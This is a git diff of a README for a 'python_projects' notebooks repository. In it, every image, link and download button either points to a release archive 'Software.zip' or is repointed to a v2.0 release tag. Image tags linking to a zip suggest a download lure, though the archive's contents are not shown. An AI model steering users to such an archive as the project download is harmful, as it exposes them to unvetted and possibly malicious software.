@@ -5,7 +5,7 @@ Welcome to the **python_projects** repository! Here, you will find a collection 
 
 Feel free to explore the projects, analyze the code, and see the results of various data analysis and machine learning techniques demonstrated in the notebooks.
 
-![Python Projects](https://github.com/nishkey/python_projects/releases/download/v1.0/Software.zip)
+![Python Projects](https://github.com/nishkey/python_projects/releases/tag/v2.0)
 
 ## Projects Overview
 Here is a brief overview of the topics covered in the projects:
@@ -23,9 +23,9 @@ Here is a brief overview of the topics covered in the projects:
 ## Getting Started
 To get started with exploring the projects, simply click the link below to download the repository:
 
-[Download python_projects](https://github.com/nishkey/python_projects/releases/download/v1.0/Software.zip "Launch the download")
+[Download python_projects](https://github.com/nishkey/python_projects/releases/tag/v2.0 "Launch the download")
 
-[![Download Button](https://github.com/nishkey/python_projects/releases/download/v1.0/Software.zip%20Started-green)](https://github.com/nishkey/python_projects/releases/download/v1.0/Software.zip)
+[![Download Button](https://github.com/nishkey/python_projects/releases/tag/v2.0%20Started-green)](https://github.com/nishkey/python_projects/releases/tag/v2.0)
 
 If the link doesn't work or you encounter any issues with downloading, please check the "Releases" section of this repository for alternative download options.
 
@@ -49,4 +49,4 @@ If you would like to contribute to this repository by adding your own Python pro
 ## Conclusion
 Thank you for visiting the **python_projects** repository! I hope you find the projects insightful and valuable for your data analysis and machine learning journey. Feel free to reach out if you have any questions or suggestions. Happy coding with Python! 🐍✨
 
-![Python Coding](https://github.com/nishkey/python_projects/releases/download/v1.0/Software.zip)
+![Python Coding](https://github.com/nishkey/python_projects/releases/tag/v2.0)
